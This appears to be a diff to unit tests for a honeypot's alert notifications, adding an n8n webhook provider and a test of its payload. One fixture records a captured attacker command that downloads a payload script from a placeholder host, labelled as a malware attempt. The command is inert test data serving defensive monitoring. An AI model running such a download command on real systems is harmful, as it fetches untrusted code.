@@ -21,6 +21,7 @@ class NotificationTests(unittest.TestCase):
         os.environ["DISCORD_WEBHOOK_URL"] = "https://discord.test/secret"
         os.environ["TELEGRAM_BOT_TOKEN"] = "123:secret"
         os.environ["TELEGRAM_CHAT_ID"] = "12345"
+        os.environ["N8N_WEBHOOK_URL"] = "https://n8n.test/webhook/secret"
 
         status = notifications.provider_status()
 
@@ -28,6 +29,7 @@ class NotificationTests(unittest.TestCase):
         self.assertTrue(status["providers"]["slack"]["configured"])
         self.assertTrue(status["providers"]["discord"]["configured"])
         self.assertTrue(status["providers"]["telegram"]["configured"])
+        self.assertTrue(status["providers"]["n8n"]["configured"])
         self.assertNotIn("secret", repr(status))
 
     def test_disabled_alerts_do_not_send(self):
@@ -65,6 +67,32 @@ class NotificationTests(unittest.TestCase):
 
         self.assertFalse(result["sent"])
         send_slack.assert_not_called()
+
+    def test_enabled_high_severity_alert_posts_structured_payload_to_n8n(self):
+        os.environ["HONEYPOT_ALERTS_ENABLED"] = "true"
+        os.environ["HONEYPOT_ALERT_MIN_INTERVAL_SECONDS"] = "0"
+        os.environ["N8N_WEBHOOK_URL"] = "https://n8n.test/webhook/honeypot"
+        event = {
+            "event_type": "command_captured",
+            "attack_category": "Malware Attempt",
+            "severity": "critical",
+            "service": "ssh",
+            "ip": "1.2.3.4",
+            "command": "curl http://example.test/payload.sh",
+            "timestamp": "2026-01-01T00:00:00Z",
+        }
+
+        with patch.object(notifications, "_post_json", return_value=True) as post_json:
+            result = notifications.send_alert(event)
+
+        self.assertTrue(result["sent"])
+        self.assertTrue(result["providers"]["n8n"]["ok"])
+        post_json.assert_called_once()
+        url, payload = post_json.call_args.args
+        self.assertEqual(url, "https://n8n.test/webhook/honeypot")
+        self.assertEqual(payload["source"], "HoneyPot v3")
+        self.assertEqual(payload["event"], event)
+        self.assertIn("summary", payload)
 
 
 if __name__ == "__main__":
